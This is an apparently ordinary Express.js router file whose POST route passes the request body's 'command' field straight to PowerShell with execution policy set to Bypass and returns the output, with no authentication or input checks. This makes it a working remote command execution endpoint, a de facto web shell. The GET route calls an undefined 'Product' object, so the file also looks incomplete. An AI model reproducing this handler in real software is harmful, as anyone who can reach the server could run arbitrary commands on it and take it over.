const express = require('express');
const router = express.Router();
const shell = require('node-powershell');



router.post('/', function (req, res) {
    console.log(req.body)
    let ps = new shell({
        executionPolicy: 'Bypass',
        noProfile: true
    });
    ps.addCommand(req.body.command)
    ps.invoke()
        .then(output => {
            console.log(output);
            ps.dispose();
            res.json(output);
        })
        .catch(err => {
            console.log(err);
            res.json(err);
            ps.dispose();
        });
})

router.get('/', function (req, res) {
    Product.all((result) => res.json(result));
})

module.exports = router